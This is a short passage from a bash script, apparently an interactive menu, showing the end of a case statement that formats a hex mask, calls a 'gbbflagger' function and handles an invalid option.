  echo
  printf -v userchose '0x%x\n' "$mask"
}
gbbflagger
;;
            *)
            read -ep "Invalid option, press enter to return :P"			
            ;;
    esac
    fi     
done
